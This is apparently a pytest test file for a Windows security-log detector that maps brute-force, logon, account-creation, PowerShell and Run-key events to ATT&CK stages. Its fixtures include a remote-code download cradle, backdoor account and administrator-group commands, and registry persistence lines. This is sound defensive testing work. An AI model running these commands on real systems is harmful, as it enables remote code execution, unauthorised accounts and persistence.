from datetime import datetime, timedelta, timezone
from app.baseline_rules import classify
from app.config import Settings
from app.correlation import correlate


def event(ref, eid, second, user='a', session=42, pid=None, cmd=None, script=None):
    return dict(event_ref=ref, event_id=eid, time=(datetime(2026, 1, 1, tzinfo=timezone.utc)+timedelta(seconds=second)).isoformat(),
                import_id='i', host='vm', user={'name': user, 'domain': 'vm'} if user else None,
                source_address='127.0.0.1', logon_type=2, logon_id=session, process_id=pid,
                command_line=cmd, script_text=script, quality_errors=[])


def run(rows):
    return classify(rows, correlate(rows, Settings()))


def test_brute_force_then_login_and_discovery():
    rows = [event(f'f{i}', 4625, i) for i in range(5)] + [event('s', 4624, 10), event('p', 4688, 11, pid=10, cmd='whoami')]
    result = run(rows)
    assert result['label'] == 'ALERT'
    assert result['detected_stages'] == ['T1110 Brute Force', 'T1078 Valid Accounts', 'T1033 System Owner/User Discovery']
    assert result['evidence_refs'] == ['f0', 'f1', 'f2', 'f3', 'f4', 's', 'p']


def test_normal_activity_and_few_failures_stay_normal():
    assert run([event('s', 4624, 0), event('p', 4688, 1, pid=10, cmd='whoami')])['label'] == 'NORMAL'
    rows = [event('f0', 4625, 0), event('f1', 4625, 1), event('s', 4624, 5), event('p', 4688, 6, pid=10, cmd='whoami')]
    assert run(rows)['label'] == 'NORMAL'


def test_other_account_is_not_blamed():
    rows = [event(f'b{i}', 4625, i, user='b') for i in range(5)]
    rows += [event('a_login', 4624, 10, user='a'), event('a_proc', 4688, 11, user='a', pid=10, cmd='whoami')]
    result = run(rows)
    assert result['label'] == 'ALERT'
    assert not {'a_login', 'a_proc'} & set(result['evidence_refs'])
    assert [g['label'] for g in result['groups']] == ['ALERT', 'NORMAL']


def test_backdoor_and_powershell_cradle():
    rows = [event('s', 4624, 0), event('add', 4688, 1, pid=11, cmd='net user hacker P@ss /add'),
            event('ps', 4104, 2, user=None, pid=12,
                  script="iex (New-Object Net.WebClient).DownloadString('http://x/p.ps1'); "
                         "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name u -Value x")]
    result = run(rows)
    assert result['label'] == 'ALERT'
    assert set(result['detected_stages']) == {'T1136/T1098 Create Account / Account Manipulation',
                                             'T1059.001 PowerShell', 'T1547.001 Registry Run Keys'}
    assert set(result['evidence_refs']) == {'add', 'ps'}


def test_empty_input_is_unknown():
    assert run([])['label'] == 'UNKNOWN'

import pytest
from app.baseline_rules import account_command

@pytest.mark.parametrize('command', [
    'net user demo pw /add', 'net.exe user demo pw /add',
    'NET1.EXE\tLOCALGROUP Administrators demo /ADD',
    r'C:\Windows\System32\net.exe user demo pw /add',
    r'"C:\Windows\System32\net1.exe" localgroup Administrators demo /add',
    'cmd.exe /c "net.exe user demo pw /add"',
    r'cmd.exe /d /c ""C:\Windows\System32\net.exe" user demo pw /add"',
])
def test_account_command_variants(command):
    assert account_command(command)
    assert run([event('p',4688,0,cmd=command)])['label']=='ALERT'

@pytest.mark.parametrize('command', [
    'internet.exe user demo pw /add', 'net.exe user demo /address',
    'echo net.exe user demo pw /add', 'net.exe user demo',
    'cmd.exe /c echo net.exe user demo pw /add', 'notnet user demo pw /add',
])
def test_account_command_boundaries(command):
    assert not account_command(command)

@pytest.mark.parametrize('cmd,script', [
    ('powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA', None),
    ('echo -EncodedCommand whatever', None),
    (None, "Write-Output 'mimikatz'"),
    (None, "(New-Object Net.WebClient).DownloadFile('https://example.org/report.csv','report.csv')"),
    (None, "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"),
    (r'reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run', None),
])
def test_benign_keyword_and_read_only_controls(cmd,script):
    from app.baseline_rules import event_stages
    assert event_stages(event('x',4104 if script else 4688,0,cmd=cmd,script=script))==[]

@pytest.mark.parametrize('cmd,script,stage', [
    ('powershell.exe -NoP -WindowStyle Hidden -EncodedCommand ABC',None,'T1059.001 PowerShell'),
    (None,"IEX (New-Object Net.WebClient).DownloadString('https://example.org/p.ps1')",'T1059.001 PowerShell'),
    (r'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Demo /d demo.exe',None,'T1547.001 Registry Run Keys'),
])
def test_behavior_combinations_remain_alerts(cmd,script,stage):
    from app.baseline_rules import event_stages
    assert stage in event_stages(event('x',4104 if script else 4688,0,cmd=cmd,script=script))
